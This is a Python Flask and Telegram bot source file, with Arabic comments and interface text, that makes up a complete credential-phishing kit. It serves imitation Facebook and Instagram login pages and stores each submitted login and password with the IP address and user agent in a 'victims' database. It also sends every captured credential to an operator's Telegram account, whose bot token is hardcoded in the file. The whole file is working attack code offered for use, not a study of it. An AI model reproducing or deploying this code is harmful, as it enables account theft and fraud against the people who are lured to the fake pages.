import os
import logging
from flask import Flask, request, render_template_string
import sqlite3
import telebot
from telebot.types import Update

# التوكن والآيدي
BOT_TOKEN = "8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4"
ADMIN_ID = "7604667042"

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# قواعد البيانات
def init_db():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            phishing_page TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            page_name TEXT,
            page_url TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# صفحات التصيد
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; }
        .container { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color: #1877f2; text-align: center;">Facebook</h2>
        <form action="/submit_facebook" method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

INSTAGRAM_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: Arial; background: #fafafa; }
        .container { width: 350px; margin: 50px auto; background: white; padding: 30px; border: 1px solid #dbdbdb; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="text-align: center;">Instagram</h2>
        <form action="/submit_instagram" method="post">
            <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

# أوامر البوت
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا البوت")
        return
    
    victims_count = get_victims_count()
    pages_count = get_pages_count()
    last_victim = get_last_victim()
    
    welcome_text = f"""
🎣 **بوت التصيد الجهنمي**

📊 **الإحصائيات:**
• عدد الضحايا: {victims_count}
• الصفحات النشطة: {pages_count}
• آخر ضحية: {last_victim}

⚡ **الأوامر:**
/create_facebook - إنشاء صفحة فيسبوك
/create_instagram - إنشاء صفحة انستغرام  
/victims - عرض الضحايا
/stats - الإحصائيات
/test - اختبار البوت
    """
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['test'])
def test_command(message):
    bot.reply_to(message, "✅ البوت يعمل بنجاح!")

@bot.message_handler(commands=['create_facebook'])
def create_facebook_command(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        return
    
    # الحصول على رابط التطبيق من متغير البيئة
    app_url = os.environ.get('RENDER_EXTERNAL_URL', request.host_url)
    page_url = f"{app_url}facebook_login"
    save_page("فيسبوك", page_url)
    
    bot.reply_to(message, f"🌐 **صفحة فيسبوك جاهزة:**\n`{page_url}`", parse_mode='Markdown')

@bot.message_handler(commands=['create_instagram'])
def create_instagram_command(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        return
    
    app_url = os.environ.get('RENDER_EXTERNAL_URL', request.host_url)
    page_url = f"{app_url}instagram_login"
    save_page("انستغرام", page_url)
    
    bot.reply_to(message, f"📸 **صفحة انستغرام جاهزة:**\n`{page_url}`", parse_mode='Markdown')

@bot.message_handler(commands=['victims'])
def victims_command(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        return
    
    victims = get_recent_victims()
    if not victims:
        bot.reply_to(message, "📭 لا توجد ضحايا حتى الآن")
        return
    
    victims_text = "👥 **آخر 5 ضحايا:**\n\n"
    
    for victim in victims:
        victims_text += f"📧 {victim[1]}\n🔑 {victim[2]}\n🕒 {victim[6]}\n\n"
    
    bot.reply_to(message, victims_text, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        return
    
    victims_count = get_victims_count()
    pages_count = get_pages_count()
    
    stats_text = f"""
📊 **إحصائيات البوت:**

🎯 **الضحايا:** {victims_count}
🌐 **الصفحات النشطة:** {pages_count}
🟢 **حالة البوت:** نشط
    """
    
    bot.reply_to(message, stats_text, parse_mode='Markdown')

# Routes التصيد
@app.route('/')
def home():
    return "🚀 البوت يعمل بنجاح! أرسل /start في التليجرام"

@app.route('/facebook_login')
def facebook_login():
    return render_template_string(LOGIN_PAGE)

@app.route('/instagram_login')
def instagram_login():
    return render_template_string(INSTAGRAM_PAGE)

@app.route('/submit_facebook', methods=['POST'])
def submit_facebook():
    email = request.form['email']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    save_victim(email, password, ip, user_agent, "فيسبوك")
    
    # إرسال إشعار للتليجرام
    try:
        bot.send_message(
            ADMIN_ID,
            f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error sending message: {e}")
    
    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."

@app.route('/submit_instagram', methods=['POST'])
def submit_instagram():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    save_victim(username, password, ip, user_agent, "انستغرام")
    
    try:
        bot.send_message(
            ADMIN_ID,
            f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error sending message: {e}")
    
    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK'
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'ERROR'

# إعداد Webhook تلقائياً عند التشغيل
@app.before_first_request
def setup_webhook():
    try:
        # الحصول على رابط التطبيق
        app_url = os.environ.get('RENDER_EXTERNAL_URL', '')
        if app_url:
            webhook_url = f"{app_url}/webhook"
            bot.remove_webhook()
            bot.set_webhook(url=webhook_url)
            logger.info(f"Webhook set to: {webhook_url}")
        else:
            # استخدام Polling للتنمية المحلية
            bot.remove_webhook()
            logger.info("Webhook removed, using polling")
    except Exception as e:
        logger.error(f"Webhook setup error: {e}")

# دوال مساعدة
def save_victim(email, password, ip, user_agent, page):
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO victims (email, password, ip_address, user_agent, phishing_page) VALUES (?, ?, ?, ?, ?)",
        (email, password, ip, user_agent, page)
    )
    conn.commit()
    conn.close()

def save_page(page_name, page_url):
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO pages (page_name, page_url) VALUES (?, ?)",
        (page_name, page_url)
    )
    conn.commit()
    conn.close()

def get_victims_count():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM victims")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_pages_count():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM pages")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_last_victim():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT email, captured_at FROM victims ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()
    conn.close()
    return f"{result[0]} - {result[1]}" if result else "لا يوجد"

def get_recent_victims():
    conn = sqlite3.connect('phishing.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM victims ORDER BY id DESC LIMIT 5")
    victims = cursor.fetchall()
    conn.close()
    return victims

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
